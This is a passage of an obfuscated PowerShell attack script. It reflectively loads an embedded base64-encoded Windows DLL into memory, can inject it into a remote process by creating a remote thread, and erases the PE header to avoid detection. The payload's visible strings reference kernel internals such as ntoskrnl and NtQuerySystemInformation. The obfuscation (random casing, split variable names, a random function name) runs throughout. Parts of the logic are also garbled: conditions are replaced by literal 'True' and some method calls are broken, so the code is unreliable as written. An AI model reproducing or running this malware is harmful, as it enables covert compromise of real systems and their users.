         [IntPtr]${WsTRINGfuNCaddr} = &'Get-MemoryProcAddress' -PEHandle ${peHANDLe} -FunctionName 'WStringFunc'
         if 'True'
         {
          Throw 'Couldn't find function address.'
         }
         ${WstriNgFUNcdELegaTE} = &'Get-DelegateType' @() 'System.IntPtr'
         ${WSTRINGfuNC} =   (&'itEm' VArIabLe:mlHIT).vAlUE::'GetDelegateForFunctionPointer'.Invoke' '
         [IntPtr]${OUTpUtPTR} = ${wsTRINgFuNC}."inVoKe"()
         ${OUTpuT} =   (&'GeT-VArIAblE' 'mLhiT').valUe::'PtrToStringUni'.Invoke(${OUtPUtPTR})
         &'Write-Output' ${oUtPUt}
              }
 
              'String' {
                  &'Write-Verbose' 'Calling function with String return type'
         [IntPtr]${stRINgFuNcAdDR} = &'Get-MemoryProcAddress' -PEHandle ${PeHANDle} -FunctionName 'StringFunc'
         if 'True'
         {
          Throw 'Couldn't find function address.'
         }
         ${sTRingFuNcdeLegATE} = &'Get-DelegateType' @() 'System.IntPtr'
         ${STriNGFUNc} =   $mLHIT::'GetDelegateForFunctionPointer'.Invoke' '
         [IntPtr]${OUTpUTptR} = ${StRInGFuNC}."iNVOke"()
         ${ouTput} =  (&('GI')  ("variABl"+"E"+":M"+"L"+"hIT")).VaLue::'PtrToStringAnsi'.Invoke(${oUtpUTptR})
         &'Write-Output' ${OUTPut}
              }
 
              'Void' {
                  &'Write-Verbose' 'Calling function with Void return type'
         [IntPtr]${VOIdFUnCaDDR} = &'Get-MemoryProcAddress' -PEHandle ${pEhANDle} -FunctionName 'VoidFunc'
         if 'True'
         {
 
         }
      else
      {
         ${voidFuncdELEgaTe} = &'Get-DelegateType' @() 'System.Void'
         ${voiDFunc} =  $MlHit::'GetDelegateForFunctionPointer'.Invoke' '
         ${voiDFUnc}."INVokE"() | &'Out-Null'
      }
              }
          }
 
 
 
   }
 
   elseif ((${PEINfO}."fILETyPe" -ieq "DLL") -and (${ReMOtEPRoCHAndLe} -ne   (&'GEt-vaRiaBLe' 't2NgF').vAlue::"zERo"))
   {
    ${VoiDfuNCAddr} = &'Get-MemoryProcAddress' -PEHandle ${pehaNDlE} -FunctionName 'VoidFunc'
    if 'True'
    {
 
    }
    else{
    ${VOIDFUNcAddr} = &'Sub-SignedIntAsUnsigned' ${voidfuNCAddr} ${PEHandLE}
    ${vOIDfUNcaDDR} = &'Add-SignedIntAsUnsigned' ${VoidfuNcADdR} ${rEMOTePehaNDLE}
 
 
    ${RThREaDHANDle} = &'Create-RemoteThread' -ProcessHandle ${rEMOTEProCHAnDLe} -StartAddress ${voidfUNcaDdr} -Win32Functions ${wiN32fuNctIONS}
    }
   }
 
 
 
   if (${reMOtEPrOchANDLe} -eq  (&'itEM' vaRiaBlE:t2ngF).vALUe::"ZERo" -and ${PeINFO}."fIleTYPE" -ieq "DLL")
   {
 
   }
   else
   {
 
 
 
 
 
 
   }
 
   &'Write-Verbose' 'Done!'
  }
 
  &'Main'
 }
 
 
 Function MAIn
 {
  if ((${PSCMdLet}."myinVOcATION"."BOUNdparaMeTeRS"['Debug'] -ne ${nULL}) -and ${PSCmdLEt}."MyINVOCATioN"."bOUndparAmeteRs"['Debug']."ISpreSeNT")
  {
   ${deBUgPrEFEReNce}  = 'Continue'
  }
 
  &'Write-Verbose' 'PowerShell ProcessID: 376'
 
 
  ${E_maGiC} = (${PEByTeS}[0..1] | &('%') {[Char] ${_}}) -join ''
 
     if (${E_MAgic} -ne 'MZ')
     {
         throw 'PE is not a valid PE file.'
     }
 
  if 'True' {
 
 
   ${PEBYTes}[0] = 0
   ${pebyTeS}[1] = 0
  }
 
 
  if (${ExeArgs} -ne ${NULL} -and ${EXEaRgs} -ne '')
  {
   ${ExEARGS} = 'ReflectiveExe '
  }
  else
  {
   ${EXEArGS} = 'ReflectiveExe'
  }
 
  if 'True'
  {
   &'Invoke-Command' -ScriptBlock ${ReMoTEScRiPTBlock} -ArgumentList @'     '
  }
  else
  {
   &'Invoke-Command' -ScriptBlock ${rEmOteScRIPTBlOCk} -ArgumentList @'     ' -ComputerName ${CoMPUTeRname}
  }
 }
 
 &'Main'
 }
 
 function INvOKE-wxHOlFpVNwPwozlYPml
 {
 
 ${pEBYtEs32} = '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i0X4mSvIG/KJTbAPtkX/hcB0DYtF7ANFsANFuOsI6waLRewDRbBei+Vdw1WL7IHsCAEAAFboAAAAAD6DBCQRdQV0A+koFFj/4ADpZg9XwGYPE0XMg6UA////AIOl/P7//wCDZewAam5YZomFHP///2p0WGaJhR7///9qZFhmiYUg////amxYZomFIv///2psWGaJhST///9qLlhmiYUm////amRYZomFKP///2psWGaJhSr///9qbFhmiYUs////M8BmiYUu////M8BmiYUw////jY0c////6FYYAACJRdSJVdjHRdwAAAEAg2XgAMZFkE7GRZF0xkWSUcZFk3XGRZRlxkWVcsZFlnnGRZdTxkWYecZFmXPGRZp0xkWbZcZFnG3GRZ1JxkWebsZFn2bGRaBvxkWhcsZFom3GRaNhxkWkdMZFpWnGRaZvxkWnbsZFqAD/ddj/ddSNTZDorhgAAImFbP///4mVcP///4uFbP///wuFcP///3R4i0XUC0XYdHCLTdzoFnMAAIlF7IN97AB1Autdg6UE////AI2FBP///5lSUP914P913ItF7JlSUGoAagtqBP+1cP////+1bP///+g9FgAAg8QsiYX4/v//6x+LTezo1nIAAItF3ANF3ItN4BNN4IlF3IlN4DPAQHWQg33sAHUJM8Az0umCBAAAuCgBAABrwACLTeyLVAEYiVXMi0QBHIlF0GgAgAAAagD/dez/FcQxARCLRcwLRdB1CTPAM9LpSAQAAIOlUP///wDGRfMAam5YZomFNP///2p0WGaJhTb///9qb1hmiYU4////anNYZomFOv///2prWGaJhTz///9qclhmiYU+////am5YZomFQP///2psWGaJhUL///9qLlhmiYVE////amVYZomFRv///2p4WGaJhUj///9qZVhmiYVK////M8BmiYVM////M8BmiYVO////jYVQ////UOhX+f//WYlF6GYPV8BmDxOFfP///4NlhACDfegAdQkzwDPS6YQDAABmD1fAZg8TRfSLRdQLRdgPhBADAADGRcBMxkXBZMZFwnLGRcNMxkXEb8ZFxWHGRcZkxkXHRMZFyGzGRclsxkXKAP912P911I1NwOjAFgAAiUWIiVWMi0WIC0WMD4TEAgAAi0XomYmFXP///4mVYP////916P8VzDEBENHgZomFVP///w+3hVT///9AQGaJhVb///+DpWT///8AjY1k////6DkSAABqAGoA/xWsMQEQiUXkg2X8AIN95AAPhgMBAAD/dej/FcwxARCL8I2FNP///1D/FcwxARADdeQDxo1MAATou3AAAIlF/IN9/AAPhNAAAAD/deT/dfz/FawxARCJReSDfeQAD4avAAAA/3X8/xXMMQEQi038D7dEQf6D+Fx0E/91/P8VzDEBEGpcWYtV/GaJDEL/dfz/FcwxARCJhRD/////dej/dfz/FZwxARCNRYRQjYV8////UDPSi0386EYOAABZWYlF9IlV+ItF9AtF+HU8M8CLjRD///+LVfxmiQRKjYU0////UP91/P8VnDEBEI1FhFCNhXz///9QM9KLTfzoAg4AAFlZiUX0iVX4i0386PlvAADrCItN/OjvbwAAi0X0C0X4D4W/AAAAx4UU////AQAAAIOlGP///wCNRfSZUlCNhVT///+ZUlCNhRT///+ZUlBqAGoAagT/dYz/dYjo/RIAAIPELImFaP///4O9aP///wB1CItF9AtF+HVrjYU0////mYmFXP///4mVYP///42FNP///1D/FcwxARDR4GaJhVT///8Pt4VU////QEBmiYVW////jUX0mVJQjYVU////mVJQjYUU////mVJQagBqAGoE/3WM/3WI6IESAACDxCyJhWj///+NjWT////onA8AAItN6OgRbwAAi0X0C0X4dHzGRaxIxkWtYcZFrmzGRa9ExkWwacZFsXPGRbJwxkWzYcZFtHTGRbVjxkW2aMZFt1TGRbhhxkW5YsZFumzGRbtlxkW8AP91+P919I1NrOgUFAAAiYUI////iZUM////i4UI////K0X0i40M////G034iYV0////iY14////i4V8////C0WAdBr/dYD/tXz/////dfj/dfSLTYTobQsAAIPEEA+2RfOFwHQgi0XMA4V0////i1XQE5V4////M8kDhVD///8T0esU6xKLRcwDhXT///+LVdATlXj///9ei+Vdw1WL7IHsWAcAAFNWV+gAAAAAPoMEJBF1BXQD6SgUWP/gAOlqblhmiYX8/v//anRYZomF/v7//2pkWGaJhQD///9qbFhmiYUC////amxYZomFBP///2ouWGaJhQb///9qZFhmiYUI////amxYZomFCv///2psWGaJhQz///8zwGaJhQ7///8zwGaJhRD///+Nhfz+//9Q/xWwMQEQiUXkg6X4/v//AGYPV8BmDxOFJP///2YPV8BmDxOFTP///2YPV8BmDxOFRP///4NlhACDpVT///8AuhQBAACNjYT9///ozvD//8eFhP3//xQBAADGRbhSxkW5dMZFumzGRbtHxkW8ZcZFvXTGRb5WxkW/ZcZFwHLGRcFzxkXCacZFw2/GRcRuxkXFAI1FuFD/deT/FaAxARCJhfT+//+NhYT9//9Q/5X0/v//g72I/f//BXV06LcMAACFwHQ0xwWcEgIQYAEAAMcFpBICEGgAAADHBawSAhDgAAAAxwWYEgIQ2AAAAMcFlBICEIgBAADrMscFnBICENgAAADHBaQSAhA4AAAAxwWsEgIQmAAAAMcFmBICEJQAAADHBZQSAhAkAQAA6boBAACDvYj9//8GD4WmAQAA6DYMAACFwA+E5gAAAMcFoBICEPgAAACDvYz9//8AdWjorvf//4mFTP///4mVUP///8eFRP///wgAAACDpUj///8AuESkABCZiYUk////iZUo////xwWcEgIQaAEAAMcFpBICEGgAAADHBawSAhDgAAAAxwWYEgIQ6AAAAMcFlBICEIgBAADrZuhG9///iYVM////iZVQ////x4VE////CAAAAIOlSP///wC4hKQAEJmJhST///+JlSj////HBZwSAhAIAgAAxwWkEgIQcAAAAMcFrBICEIgBAADHBZgSAhCAAQAAxwWUEgIQiAEAAOmxAAAAxwWgEgIQlAAAAIO9jP3//wB1UOj68///iUWEx4VU////BAAAAMcFqBICEBsSAADHBZwSAhDgAAAAxwWkEgIQSAAAAMcFrBICEKAAAADHBZgSAhCcAAAAxwWUEgIQJAEAAOtO6Krz//+JRYTHhVT///8EAAAAxwWoEgIQJhIAAMcFnBICEPgAAADHBaQSAhBQAAAAxwWsEgIQuAAAAMcFmBICELQAAADHBZQSAhAkAQAA6wczwOmnBwAAx0X4AAEAAMeFMP///wAQAADGRYhOxkWJdMZFikHGRYtsxkWMbMZFjW/GRY5jxkWPYcZFkHTGRZFlxkWSVsZFk2nGRZRyxkWVdMZFlnXGRZdhxkWYbMZFmU3GRZplxkWbbcZFnG/GRZ1yxkWeecZFnwCDpZj+//8AagZZM8CNvZz+///zq/+1MP///42FmP7//1D/dfj/FbwxARCDjbT+////g424/v///41FiFD/deT/FaAxARCJhRT///+DvRT///8AdQczwOnbBgAAg6UY////AGoEaAAwAACNhTD///9QagCNRfhQ/xW0MQEQUP+VFP///4mFGP///4O9GP///wB0BzPA6Z0GAABqAGgAAAIAagBqAP8VdDIBEImFIP///4O9IP///wB1F2gAgAAAagD/dfj/FcQxARAzwOlmBgAA/7Ug/////xV4MgEQhcB1F2gAgAAAagD/dfj/FcQxARAzwOk/BgAAaIABAACykI2NqPr//+ij7P//WY2FqPr//1BqIGoBagFqYP8ViDABEIlF4I2FqPr//1BqIGoBagFqYP8ViDABEIlF/OjeCAAAhcAPhAYDAAC6AAIAAI2NqPj//+ht7P///3Xg6Njt//9ZiYXo/v//iZXs/v///3X86MPt//9ZiYV8////iVWAg6XE/v//AIOlQP///wCLhUD///+LjXz///+JSCiLTYCJSCyLhej+//+D6AiLjez+//+D2QCLlUD///+JQlCJSlSNhaj4//+JhVj///9qCFhrwACLjVj///+LlXz///+JFAGLVYCJVAEEaghYweAAi41Y////i5V8////iRQBi1WAiVQBBGoIWNHgA4VY////iUX0agRYa8AAi030xwQBgAEAAGoEWMHgAItN9McEAc2rAABqBFjR4ItN9McEAQYAAABqBFhrwAOLTfTHBAEAAAEAagRYa8AGi030xwQBAAKABI2FqPj//5lSUGoBagBoBxMAAOjiCQAAg8QUiUXoiVXsi4VM////A4VE////i41Q////E41I////iYXQ/v//iY3U/v//Zg9XwGYPE4XI/v//jYXQ/v//mVJQagBqCItF4JlSUGoDagBotBAAAOiICQAAg8QkiUXoiVXsjYXI/v//mVJQagBqCItF/JlSUGoDagBo3hAAAOheCQAAg8QkiUXoiVXsjYUk////mVJQagBqCItF/JlSUGoDagBotBAAAOg0CQAAg8QkiUXoiVXsjY38/v//6IQLAACJheD+//+JleT+///GRaBOxkWhdMZFolHGRaN1xkWkZcZFpXLGRaZ5xkWnScZFqG7GRal0xkWqZcZFq3LGRax2xkWtYcZFrmzGRa9QxkWwcsZFsW/GRbJmxkWzacZFtGzGRbVlxkW2AP+15P7///+14P7//41NoOjjCwAAiYU4////iZU8////i4U4////C4U8////dRdoAIAAAGoA/3X4/xXEMQEQM8DpUAMAAGYPV8BmDxOFvP7//42FvP7//5lSUGoAaDcTAABqAv+1PP////+1OP///+h6CQAAg8QciUXoiVXsjYXI/v//mVJQagBqCItF/JlSUGoDagBotBAAAOgaCAAAg8QkiUXoiVXs6dYCAAD/deDoSOv//1mJhdj+////dfzoOev//1mJhXj///+DpTT///8Ag6Us////AIuFLP///4uNeP///4lIFIuF2P7//4PoBIuNLP///4lBLLpcAQAAjY0o/P//6Brp//+NhSj8//+JhXT///9qBFhrwACLjXT///+LlXj///+JFAFqBFjB4ACLjXT///+LlXj///+JFAFqBFjR4AOFdP///4lF8GoEWGvAAItN8McEAYABAABqBFjB4ACLTfDHBAHNqwAAagRY0eCLTfDHBAEGAAAAagRYa8ADi03wxwQBAAABAGoEWGvABYtN8McEAQACgASNhSj8//+Jhdz+//9g/7Xc/v//6IDo///HRCQcRAAAAGGLRYQDhVT///+JhfD+///HhTT////xFQAQg6Uc////AI2F8P7//1BqBP914P8VhDABEI2FHP///1BqBP91/P8VjDABEI2FNP///1BqBP91/P8VhDABEMZFyE7GRcl0xkXKUcZFy3XGRcxlxkXNcsZFznnGRc9JxkXQbsZF0XTGRdJlxkXTcsZF1HbGRdVhxkXWbMZF11DGRdhyxkXZb8ZF2mbGRdtpxkXcbMZF3WXGRd4AjUXIUP915P8VoDEBEKP4EgIQgz34EgIQAA+F0AAAAMaFXP///1rGhV3///93xoVe////UcaFX////3XGhWD///9lxoVh////csaFYv///3nGhWP///9JxoVk////bsaFZf///3TGhWb///9lxoVn////csaFaP///3bGhWn///9hxoVq////bMaFa////1DGhWz///9yxoVt////b8aFbv///2bGhW////9pxoVw////bMaFcf///2XGhXL///8AjUXIUP915P8VoDEBEKP4EgIQgz34EgIQAHUUaACAAABqAP91+P8VxDEBEDPA6zeNhfj+//9QaDcTAAD/FfgSAhCNhRz///9QagT/dfz/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